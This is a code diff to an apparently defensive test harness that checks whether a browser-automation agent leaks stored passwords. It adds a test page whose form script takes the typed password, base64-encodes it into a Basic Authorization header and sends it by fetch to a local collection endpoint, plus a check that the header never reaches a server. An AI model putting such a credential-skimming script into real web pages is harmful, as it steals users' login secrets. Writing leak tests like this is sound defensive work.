@@ -162,8 +162,9 @@ def make_site(good_secret: str, marker: str, get_received: list, requests_seen: 
         def do_GET(self):
             url = urlsplit(self.path)
             query = parse_qs(url.query)
+            raw = self.path + " " + " ".join(f"{k}: {v}" for k, v in self.headers.items())
             requests_seen.append({"method": "GET", "host": self.headers.get("Host", ""),
-                                  "secret": good_secret in self.path or good_secret in str(self.headers)})
+                                  "secret": good_secret in raw, "raw": raw})
             if url.path == "/login":
                 message = "Wrong password." if "error" in query else "Please sign in."
                 self._send(200, FORM.format(title="login", message=message, action="/session", extra="",
@@ -175,6 +176,13 @@ def make_site(good_secret: str, marker: str, get_received: list, requests_seen: 
             elif url.path == "/submit-action":
                 other = "http://localhost:" + str(self.server.server_port) + "/session"
                 self._send(200, handler_form("submit-action", form_extra='onsubmit="this.action=' + chr(39) + other + chr(39) + '"'))
+            elif url.path == "/basic-leak":
+                other = "http://localhost:" + str(self.server.server_port) + "/collect"
+                self._send(200, handler_form("basic-leak", form_extra=(
+                    'onsubmit="event.preventDefault(); fetch(' + chr(39) + other + chr(39) + ', {headers: {' + chr(39)
+                    + "Authorization" + chr(39) + ": " + chr(39) + "Basic " + chr(39) + " + btoa(" + chr(39) + USERNAME
+                    + ":" + chr(39) + " + this.querySelector(" + chr(39) + "input[type=password]" + chr(39)
+                    + ').value)}}); this.style.display=' + chr(39) + "none" + chr(39) + '"')))
             elif url.path == "/header-leak":
                 other = "http://localhost:" + str(self.server.server_port) + "/collect"
                 self._send(200, handler_form("header-leak", form_extra=(
@@ -300,6 +308,7 @@ def run(args) -> int:
     run_id = "live-" + secrets.token_hex(6)
     started = datetime.now(timezone.utc)
     good, wrong, kept = ocr_safe_secret(), ocr_safe_secret(), ocr_safe_secret()
+    accented = ocr_safe_secret() + chr(0xE4)
     received, get_received, requests_seen = [], [], []
     site = make_site(good, run_id, get_received, requests_seen)
     agent_site = make_agent_site(received)
@@ -312,6 +321,7 @@ def run(args) -> int:
     store.put(make_entry("leak-good", USERNAME, good, [base], run_id, True, ["login", "run"]))
     store.put(make_entry("leak-wrong", USERNAME, wrong, [base], run_id, True, ["login"]))
     store.put(make_entry("leak-kept", USERNAME, kept, [base], run_id, False, ["login", "run"]))
+    store.put(make_entry("leak-accented", USERNAME, accented, [base], run_id, True, ["login"]))
 
     shots = workdir / "screenshots"
     shots.mkdir()
@@ -436,6 +446,14 @@ print("screenshot saved")
             agent_checks[f"{case}: the secret reached the address, the history, a GET, or another host"] = (
                 good in seen or any(r["secret"] and (r["method"] == "GET" or r["host"] != allowed_host)
                                     for r in requests_seen))
+
+        # A page script sends "Basic " + btoa(username:password): ISO-8859-1, not UTF-8 (review at fbe4293e).
+        import base64
+        basic = base64.b64encode(f"{USERNAME}:{accented}".encode("latin-1")).decode()
+        requests_seen.clear()
+        login_case("page-script-sends-an-iso-8859-1-basic-header", f"{base}/basic-leak", "leak-accented", "refused")
+        agent_checks["page-script-sends-an-iso-8859-1-basic-header: the header reached a server"] = any(
+            basic in r.get("raw", "") for r in requests_seen)
 
         expected["connection-drops-while-typing"] = "exit 1"
         harness(f"import json\ngoto_url({base + '/stuck'!r})\nwait_for_load()\nprint(page_info())", out, env)
